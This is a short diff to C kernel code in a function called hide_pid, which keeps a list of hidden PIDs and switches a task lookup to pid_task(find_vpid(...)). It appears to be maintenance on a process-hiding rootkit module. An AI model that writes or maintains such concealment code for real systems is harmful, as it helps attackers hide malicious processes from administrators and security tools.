@@ -66,7 +66,7 @@ hide_pid(pid_t pid)
 
     add_pid_to_list(hidden_pids_tail, pid);
 
-    struct task_struct *ts = find_task_by_vpid(pid);
+    struct task_struct *ts = pid_task(find_vpid(pid), PIDTYPE_PID);
     struct task_struct *ts2;
 
     rcu_read_lock();
